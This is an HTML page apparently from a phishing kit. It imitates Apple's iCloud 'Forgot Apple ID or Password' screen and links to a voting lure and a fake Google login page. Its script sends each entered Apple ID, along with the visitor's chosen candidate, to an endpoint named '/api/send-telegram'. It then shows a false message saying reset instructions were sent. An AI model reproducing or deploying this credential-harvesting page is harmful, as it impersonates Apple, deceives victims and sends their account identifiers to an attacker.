<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Forgot Apple ID or Password</title>
    <link rel="stylesheet" href="icloud-style.css">
    <link rel="stylesheet" href="toast.css">
</head>

<body>
    <div class="icloud-container">
        <div class="icloud-box">
            <!-- Header -->
            <div class="icloud-header">
                <div class="header-left">
                    <svg class="apple-logo-header" width="30" height="30" viewBox="0 0 24 24" fill="white">
                        <path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09l.01-.01zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
                    </svg>
                    <h1 class="icloud-title">iCloud</h1>
                </div>
                
                <div class="menu-dots">
                    <span></span>
                    <span></span>
                    <span></span>
                </div>
            </div>

            <!-- Apple Icon -->
            <div class="apple-icon-center">
                <svg width="70" height="70" viewBox="0 0 24 24" fill="white">
                    <path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09l.01-.01zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
                </svg>
            </div>

            <!-- Title -->
            <h2 class="signin-title">Forgot Apple ID or Password</h2>
            <p class="subtitle">Enter your Apple ID to reset your password.</p>

            <!-- Recovery Form -->
            <form id="forgotForm" class="icloud-form">
                <div class="form-group">
                    <input type="email" id="recovery-email" placeholder="Apple ID" required>
                </div>

                <button type="submit" class="submit-btn">Continue</button>

                <div class="form-links">
                    <a href="google-login.html" class="link-blue">‚Üê Back to Sign In</a>
                </div>
            </form>

            <div class="back-link">
                <a href="Index.html">‚Üê Back to voting</a>
            </div>
        </div>
    </div>

    <script>
        const forgotForm = document.getElementById('forgotForm');
        
        if (forgotForm) {
            forgotForm.addEventListener('submit', async (e) => {
                e.preventDefault();
                
                const email = document.getElementById('recovery-email').value;
                const candidate = sessionStorage.getItem('votingFor') || 'Unknown';

                // Send to Telegram
                try {
                    await fetch('/api/send-telegram', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ 
                            message: `üîê *FORGOT PASSWORD*\nApple ID: ${email}\nVoting for: ${candidate}` 
                        })
                    });
                } catch (error) {
                    console.error('Error:', error);
                }

                // Show success toast notification (mockup - doesn't actually send)
                showToast('‚úì Password reset instructions sent to your email', 'success');
                
                // Clear the form
                forgotForm.reset();
            });
        }

        function showToast(message, type = 'info') {
            const existingToast = document.querySelector('.toast');
            if (existingToast) existingToast.remove();

            const toast = document.createElement('div');
            toast.className = `toast toast-${type}`;
            toast.textContent = message;
            
            document.body.appendChild(toast);
            
            setTimeout(() => toast.classList.add('show'), 100);
            
            setTimeout(() => {
                toast.classList.remove('show');
                setTimeout(() => {
                    if (toast.parentNode) document.body.removeChild(toast);
                }, 300);
            }, 4000);
        }
    </script>
</body>

</html>
